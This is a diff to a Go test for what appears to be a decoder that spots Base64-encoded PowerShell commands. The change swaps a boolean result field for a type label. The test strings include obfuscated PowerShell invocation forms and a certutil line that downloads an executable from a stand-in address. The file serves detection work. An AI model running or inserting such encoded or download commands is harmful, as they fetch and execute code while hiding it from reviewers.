@@ -175,11 +175,11 @@ func TestDecoded(t *testing.T) {
 		text string
 		want []Payload
 	}{
-		{"-EncodedCommand", "powershell.exe -nop -EncodedCommand " + enc, []Payload{{inner, true}}},
-		{"-enc, quoted", `powershell -enc "` + enc + `"`, []Payload{{inner, true}}},
-		{"-e", "pwsh -e " + enc, []Payload{{inner, true}}},
-		{"-ec without padding", "powershell -ec " + strings.TrimRight(enc, "="), []Payload{{inner, true}}},
-		{"a literal that is text", `$s = [Convert]::FromBase64String("` + literal + `")`, []Payload{{"certutil -urlcache -f http://10.0.0.2/b.exe b.exe", false}}},
+		{"-EncodedCommand", "powershell.exe -nop -EncodedCommand " + enc, []Payload{{inner, PowerShell}}},
+		{"-enc, quoted", `powershell -enc "` + enc + `"`, []Payload{{inner, PowerShell}}},
+		{"-e", "pwsh -e " + enc, []Payload{{inner, PowerShell}}},
+		{"-ec without padding", "powershell -ec " + strings.TrimRight(enc, "="), []Payload{{inner, PowerShell}}},
+		{"a literal that is text", `$s = [Convert]::FromBase64String("` + literal + `")`, []Payload{{"certutil -urlcache -f http://10.0.0.2/b.exe b.exe", ""}}},
 		{"a literal that is a binary", `[Convert]::FromBase64String("` + binary + `")`, nil},
 		{"-ExecutionPolicy is not -EncodedCommand", "powershell -ExecutionPolicy " + enc, nil},
 		{"-e with text that is not Base64 text", "grep -e AAAAAAAAAAAAAAAAAAAAAAAA file", nil},
